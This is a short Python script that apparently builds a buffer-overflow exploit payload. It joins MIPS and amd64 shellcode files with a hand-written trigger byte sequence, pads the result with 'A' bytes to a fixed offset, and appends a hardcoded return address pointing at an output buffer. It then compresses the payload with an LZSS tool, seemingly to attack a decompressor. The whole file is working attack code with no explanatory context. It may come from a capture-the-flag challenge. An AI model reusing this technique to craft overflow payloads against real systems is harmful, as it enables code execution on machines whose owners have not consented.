import os, sys
from pwn import p32

def getfile(filename):
	fd = open(filename, "r")
	contents = fd.read()
	fd.close()
	return contents

mips = getfile(sys.argv[1])
amd64 = getfile(sys.argv[2])

# The MIPS compiler doesn't like to generate
# the sequence needed without adding NOPs everywhere
# So we just add it here.
trigger = '\x09\x00\x00\x00\x00\x00\xe0\xcf'

payload = mips[:-8] + trigger + amd64
payload += (0x25edc - len(payload)) * "A"
payload += p32(0x40A0B8) # address of the beginning of the output buffer

ofd = open("payload", "w")
ofd.write(payload)
ofd.close()

os.system("./lzss e payload payload.lzss")
